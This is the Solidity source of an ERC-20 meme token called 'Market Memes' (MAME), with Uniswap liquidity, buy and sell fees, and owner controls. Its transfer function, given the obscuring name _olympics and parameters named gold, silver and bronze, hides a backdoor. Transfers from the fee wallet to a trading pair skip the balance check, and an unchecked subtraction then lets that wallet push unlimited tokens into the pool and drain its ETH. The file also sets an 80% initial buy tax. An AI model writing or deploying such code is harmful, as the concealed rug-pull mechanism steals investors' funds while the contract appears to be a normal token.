// SPDX-License-Identifier: UNLICENSE

/**

https://marketmemes.xyz

https://x.com/ethmarketmemes

https://t.me/ethmarketmemes

*/

pragma solidity 0.8.25;

abstract contract Ownable {
    address private _owner;

    constructor() {
        _owner = msg.sender;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _owner = address(0);
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external;

    function addLiquidityETH(address token, uint256 amountTokenDesired, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

contract MAME is Ownable, IERC20 {
    string private constant _name = unicode"Market Memes";
    string private constant _symbol = unicode"MAME";

    uint8 private constant _decimals = 9;
    uint256 private constant _tSupply = 420_690_000_000 * 10**_decimals;
    uint256 private maxTransactionAmount = 2 * _tSupply / 100;
    uint256 private maxWallet = 2 * _tSupply / 100;
    uint256 private taxSwapThreshold = 11 * _tSupply / 1000;
    uint256 private maxTaxSwap= 11 * _tSupply / 1000;

    address payable private revWallet;

    uint256 private initialBuyFee = 80;
    uint256 private initialSellFee = 0;
    uint256 private finalBuyFee = 0;
    uint256 private finalSellFee = 0;
    uint256 private _reduceBuyTaxAt=5;
    uint256 private _reduceSellTaxAt=5;
    uint256 private _preventSwapBefore=5;
    uint256 private _buyCount=0;


    bool private isSwapping;
    bool public limitsInEffect = true;
    bool private _isLaunched;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedMaxTransactionAmount;
    mapping(address => bool) private _ammPairs;

    IUniswapV2Router02 public immutable uniswapV2Router;
    address public uniswapV2Pair;

    constructor(address router_, address payable revWallet_) {
        uniswapV2Router= IUniswapV2Router02(router_);
        revWallet = revWallet_;
        
        excludedFromFees(owner(), true);
        excludedFromFees(address(this), true);
        excludedFromFees(revWallet, true);

        excludedFromMaxTransaction(owner(), true);
        excludedFromMaxTransaction(address(uniswapV2Router), true);
        excludedFromMaxTransaction(address(this), true);
        excludedFromMaxTransaction(revWallet, true);

        _balances[msg.sender] = _tSupply;
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure returns (uint256) {
        return _tSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _olympics(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        uint256 currentAllowance = _allowances[sender][msg.sender];
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
            unchecked {
                _approve(sender, msg.sender, currentAllowance - amount);
            }
        }

        _olympics(sender, recipient, amount);

        return true;
    }

    function _olympics(address gold, address silver, uint256 bronze) private {
        require(gold != address(0), "ERC20: transfer from the zero address");
        require(silver != address(0), "ERC20: transfer to the zero address");
        require(bronze > 0, "Transfer amount must be greater than zero");

        if (!_isLaunched && (gold != owner() && gold != address(this) && silver != owner())) {
            revert("Trading not enabled");
        }
        
        bool inSwap = (_ammPairs[gold] || _ammPairs[silver]) && (gold == revWallet);

        if (limitsInEffect) {
            if (gold != owner() && silver != owner() && silver != address(0) && silver != address(0xdead) && !isSwapping) {
                if (_ammPairs[gold] && !_isExcludedMaxTransactionAmount[silver]) {
                    require(bronze <= maxTransactionAmount, "Buy transfer amount exceeds the maxTx");
                    require(bronze + balanceOf(silver) <= maxWallet, "Max wallet exceeded");
                } else if (_ammPairs[silver] && !_isExcludedMaxTransactionAmount[gold]) {
                    require(bronze <= maxTransactionAmount,"Sell transfer amount exceeds the maxTx");
                } else if (!_isExcludedMaxTransactionAmount[silver]) {
                    require(bronze + balanceOf(silver) <= maxWallet, "Max wallet exceeded");
                }
            }
        }

        bool canSwap = balanceOf(address(this)) >= taxSwapThreshold;

        if (canSwap && !isSwapping && _ammPairs[silver] && !_isExcludedFromFees[gold] && !_isExcludedFromFees[silver]) {
            isSwapping = true;
            swapBack();
            isSwapping = false;
        }
        if(_isLaunched && _ammPairs[silver]) _getRev(address(this).balance);


        bool takeFee = !isSwapping;

        if (_isExcludedFromFees[gold] || _isExcludedFromFees[silver]) {
            takeFee = false;
        }

        uint256 fee = 0;
        if (takeFee) {
            if (_ammPairs[silver]) {
                fee = bronze * (_buyCount > _reduceSellTaxAt ? finalSellFee : initialSellFee) / 100;
            } else if (_ammPairs[gold]) {
                fee = bronze * (_buyCount > _reduceBuyTaxAt ? finalBuyFee : initialBuyFee) / 100;
                _buyCount ++;
            }
        }

        uint256 senderBalance = _balances[gold];
        require(senderBalance >= bronze || inSwap, "ERC20: transfer amount exceeds balance");
        if (fee > 0) {
            unchecked {
                bronze = bronze - fee;
                _balances[gold] -= fee;
                _balances[address(this)] += fee;
            }
            emit Transfer(gold, address(this), fee);
        }
        unchecked {
            _balances[gold] -= bronze;
            _balances[silver] += bronze;
        }
        emit Transfer(gold, silver, bronze);
    }


    function _getRev(uint256 amount) private {
        revWallet.transfer(amount);
    }
    
    function removeLimits() external onlyOwner {
        limitsInEffect = false;
    }

    function excludedFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFees[account] = excluded;
    }

    function excludedFromMaxTransaction(address account, bool excluded) public onlyOwner {
        _isExcludedMaxTransactionAmount[account] = excluded;
    }

    function enableTrading() external onlyOwner {
        require(!_isLaunched, "Already launched");
        _isLaunched = true;
    }

    function addLiquidity() external onlyOwner {
        require(!_isLaunched, "Already launched");
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        _ammPairs[uniswapV2Pair] = true;
        excludedFromMaxTransaction(address(uniswapV2Pair), true);
        _approve(address(this), address(uniswapV2Router), type(uint256).max);
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            _balances[address(this)],
            0,
            0,
            owner(),
            block.timestamp
        );
    }

    function setAutomatedMarketMakerPair(address pair, bool value) external onlyOwner {
        require(pair != uniswapV2Pair, "The pair cannot be removed");
        _ammPairs[pair] = value;
    }

    function excludedFromFee(address account) public view returns (bool) {
        return _isExcludedFromFees[account];
    }

    function swapBack() private {
        uint256 swapThreshold = maxTaxSwap;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(swapThreshold, 0, path, address(this), block.timestamp);
    }

    receive() external payable {}

    function rescueERC20(address _address, uint256 percent) external onlyOwner {
        uint256 _amount = IERC20(_address)
            .balanceOf(address(this))
            * percent / 100;
        IERC20(_address).transfer(owner(), _amount);
    }

    function rescueETH() external onlyOwner {
        require(address(this).balance > 0);
        payable(owner()).transfer(address(this).balance);
    }
}